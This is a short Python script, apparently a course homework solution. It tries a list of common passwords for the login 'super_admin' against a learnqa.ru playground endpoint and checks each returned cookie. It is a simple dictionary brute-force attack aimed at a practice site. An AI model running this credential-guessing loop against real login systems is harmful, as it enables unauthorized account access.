import requests
import json

pass_options=["password","123456","123456789","12345678","12345","qwerty","abc123","football","1234567","monkey","111111","letmein","1234","1234567890","dragon","baseball","sunshine","iloveyou","trustno1","princess","adobe123[a]","123123","welcome","login","admin","qwerty123","solo","1q2w3e4r","master","666666","photoshop[a]","1qaz2wsx","qwertyuiop","ashley","mustang","121212","starwars","654321","bailey","access","flower","555555","passw0rd","shadow","lovely","7777777","michael","!@#$%^&*","jesus","password1","superman","hello","charlie","888888","696969","hottie","freedom","aa123456","qazwsx","ninja","azerty","loveme","whatever","donald","batman","zaq1zaq1","Football","000000","123qwe"]
n=0
while n <len(pass_options):
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={'login': 'super_admin', 'password': pass_options[n]})
    a=(response.text)
    print(a)
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", data=a)
    print(response2.text)
    n += 1
